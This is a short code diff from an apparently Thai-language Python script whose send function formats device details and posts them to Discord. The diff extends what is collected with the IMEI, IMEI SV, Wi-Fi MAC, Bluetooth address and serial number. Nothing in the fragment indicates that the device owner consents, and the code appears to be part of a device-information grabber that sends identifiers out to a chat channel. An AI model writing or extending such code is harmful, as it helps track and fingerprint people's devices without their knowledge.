@@ -60,7 +60,13 @@ def send(username):
         f"🌐 เครือข่าย: {device_info['Network']}\n"
         f"💻 GPU: {device_info['GPU2']}\n"
         f"💾 การใช้งานดิสก์: {device_info['Disk Usage2']}\n"
+        f"📱 IMEI: {device_info['IMEI']}\n"
+        f"📱 IMEI SV: {device_info['IMEI SV']}\n"
+        f"📡 Wi-Fi MAC: {device_info['Wi-Fi MAC']}\n"
+        f"🔗 Bluetooth Address: {device_info['Bluetooth Address']}\n"
+        f"🔢 Serial Number: {device_info['Serial Number']}\n"
     )
+    
 
     # ส่งข้อความไปยัง Discord
     smdc(message)
